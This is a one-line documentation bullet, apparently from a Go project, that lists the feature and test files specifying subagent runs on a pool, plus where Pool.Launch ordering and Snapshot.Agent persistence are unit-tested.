- Subagent runs on the pool are specified in `features/subagents.feature` (`internal/agent/bdd_subagents_test.go`) and `features/subagents_http.feature` (`external/httpserver/bdd_subagents_test.go`); `Pool.Launch` ordering and `Snapshot.Agent` persistence are unit tests in `internal/bgtask`. See `docs/features/subagents.md`.
